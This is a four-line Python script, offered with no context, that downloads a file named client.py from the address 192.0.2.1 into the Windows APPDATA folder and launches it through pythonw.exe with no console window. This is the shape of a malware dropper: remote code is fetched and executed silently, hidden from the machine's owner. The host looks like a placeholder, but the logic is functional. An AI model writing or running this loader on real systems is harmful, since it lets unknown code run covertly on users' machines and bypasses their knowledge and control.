import os, subprocess, urllib.request
path = os.path.join(os.getenv("APPDATA"), "client.py")
urllib.request.urlretrieve("http://192.0.2.1/client.py", path)
subprocess.Popen(["pythonw.exe", path], creationflags=subprocess.CREATE_NO_WINDOW)
